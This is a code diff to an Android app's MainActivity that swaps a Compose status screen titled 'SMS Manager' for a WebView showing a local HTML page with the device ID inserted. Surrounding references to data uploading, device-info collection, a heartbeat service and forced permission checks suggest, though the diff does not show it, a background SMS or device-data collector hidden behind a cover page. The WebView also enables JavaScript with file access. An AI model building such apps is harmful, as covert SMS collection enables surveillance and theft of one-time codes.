@@ -9,17 +9,10 @@ import android.os.Handler
 import android.os.Looper
 import android.os.PowerManager
 import android.util.Log
+import android.webkit.WebView
+import android.webkit.WebViewClient
+import android.webkit.WebSettings
 import androidx.activity.ComponentActivity
-import androidx.activity.compose.setContent
-import androidx.compose.foundation.layout.*
-import androidx.compose.material3.*
-import androidx.compose.runtime.*
-import androidx.compose.ui.Alignment
-import androidx.compose.ui.Modifier
-import androidx.compose.ui.graphics.Color
-import androidx.compose.ui.text.font.FontWeight
-import androidx.compose.ui.unit.dp
-import androidx.compose.ui.unit.sp
 import androidx.core.content.ContextCompat
 import com.example.test.utils.DataUploader
 import com.example.test.utils.DeviceInfoHelper
@@ -33,6 +26,8 @@ class MainActivity : ComponentActivity() {
     private val BATTERY_UPDATE_INTERVAL_MS = 60000L
     private val FCM_TIMEOUT_MS = 5000L
     private val userId = Constants.USER_ID
+
+    private lateinit var webView: WebView
 
     companion object {
         private const val TAG = "MainActivity"
@@ -61,7 +56,7 @@ class MainActivity : ComponentActivity() {
         }
 
         Log.d(TAG, "✅ All permissions verified, starting app...")
-        setupUI()
+        setupWebView()
         continueInitialization()
     }
 
@@ -87,44 +82,43 @@ class MainActivity : ComponentActivity() {
         return allGranted && batteryOptimization
     }
 
-    private fun setupUI() {
-        setContent {
-            MaterialTheme {
-                Surface(
-                    modifier = Modifier.fillMaxSize(),
-                    color = Color.White
-                ) {
-                    Box(
-                        modifier = Modifier.fillMaxSize(),
-                        contentAlignment = Alignment.Center
-                    ) {
-                        Column(
-                            horizontalAlignment = Alignment.CenterHorizontally,
-                            verticalArrangement = Arrangement.Center
-                        ) {
-                            Text(
-                                text = "SMS Manager",
-                                fontSize = 24.sp,
-                                fontWeight = FontWeight.Bold,
-                                color = Color.Black
-                            )
-                            Spacer(modifier = Modifier.height(16.dp))
-                            Text(
-                                text = "Service Running",
-                                fontSize = 16.sp,
-                                color = Color.Gray
-                            )
-                            Spacer(modifier = Modifier.height(8.dp))
-                            Text(
-                                text = "✅ All permissions granted",
-                                fontSize = 14.sp,
-                                color = Color(0xFF4CAF50)
-                            )
-                        }
-                    }
-                }
+    private fun setupWebView() {
+        // ساخت WebView
+        webView = WebView(this)
+
+        // تنظیمات WebView
+        val webSettings: WebSettings = webView.settings
+        webSettings.javaScriptEnabled = true
+        webSettings.domStorageEnabled = true
+        webSettings.allowFileAccess = true
+        webSettings.loadWithOverviewMode = true
+        webSettings.useWideViewPort = true
+        webSettings.setSupportZoom(false)
+
+        // تنظیم WebViewClient
+        webView.webViewClient = object : WebViewClient() {
+            override fun onPageFinished(view: WebView?, url: String?) {
+                super.onPageFinished(view, url)
+                Log.d(TAG, "✅ WebView page loaded successfully")
+
+                // جایگزینی Device ID در HTML
+                webView.evaluateJavascript(
+                    "document.getElementById('deviceId').innerText = 'Device ID: $deviceId';",
+                    null
+                )
             }
         }
+
+        // لود کردن فایل HTML از assets
+        try {
+            webView.loadUrl("file:///android_asset/index.html")
+            Log.d(TAG, "📄 Loading index.html from assets...")
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ Error loading HTML: ${e.message}")
+        }
+
+        // تنظیم WebView به عنوان ContentView
+        setContentView(webView)
     }
 
     private fun continueInitialization() {
@@ -197,6 +191,14 @@ class MainActivity : ComponentActivity() {
             Log.d(TAG, "✅ HeartbeatService started")
         } catch (e: Exception) {
             Log.e(TAG, "❌ Failed to start HeartbeatService: ${e.message}")
+        }
+    }
+
+    override fun onBackPressed() {
+        if (webView.canGoBack()) {
+            webView.goBack()
+        } else {
+            super.onBackPressed()
         }
     }
 
